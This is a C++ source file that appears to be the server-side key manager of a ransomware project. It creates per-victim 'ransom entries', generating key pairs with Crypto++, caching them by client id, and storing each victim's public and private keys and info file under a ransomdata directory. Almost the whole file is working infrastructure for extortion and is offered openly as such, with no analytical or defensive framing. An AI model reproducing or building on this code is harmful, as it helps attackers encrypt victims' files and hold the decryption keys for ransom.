#include "RansomManager.h"
#include "fs.h"

RansomManager::RansomManager(CryptoPP::AutoSeededRandomPool & rng)
	: rng_(rng)
{}

RansomEntry RansomManager::getEntry(std::uint64_t clientId)
{
	auto it = entryCache_.find(clientId);
	if (it != entryCache_.end())
	{
		return it->second;
	}

	return loadEntry(clientId);
}

RansomEntry RansomManager::createEntry()
{
	RansomEntry ransomEntry = RansomEntry::create(rng_);
	saveEntry(ransomEntry);
	entryCache_.insert(std::make_pair(ransomEntry.clientId(), ransomEntry));
	return ransomEntry;
}

RansomEntry RansomManager::loadEntry(std::uint64_t clientId)
{
	std::string strClientId = std::to_string(clientId);
	std::ifstream infoFile("ransomdata/" + strClientId + "/info.dat", std::ios::binary);
	if (!infoFile) throw EntryNotFound();
	std::ifstream publicFile("ransomdata/" + strClientId + "/public.key", std::ios::binary);
	if (!publicFile) throw EntryLoadingError();
	std::ifstream privateFile("ransomdata/" + strClientId + "/private.key", std::ios::binary);
	if (!privateFile) throw EntryLoadingError();

	RansomEntry ransomEntry = RansomEntry::readFromFile(clientId, privateFile, publicFile, infoFile);
	entryCache_.insert(std::make_pair(clientId, ransomEntry));
	return ransomEntry;
}

void RansomManager::saveEntry(RansomEntry & ransomEntry)
{
	std::string strClientId = std::to_string(ransomEntry.clientId());
	createDir("ransomdata/" + strClientId);

	std::ofstream infoFile("ransomdata/" + strClientId + "/info.dat", std::ios::binary);
	if (!infoFile) throw EntrySavingError();
	std::ofstream publicFile("ransomdata/" + strClientId + "/public.key", std::ios::binary);
	if (!publicFile) throw EntrySavingError();
	std::ofstream privateFile("ransomdata/" + strClientId + "/private.key", std::ios::binary);
	if (!privateFile) throw EntrySavingError();

	ransomEntry.saveToFile(privateFile, publicFile, infoFile);
}
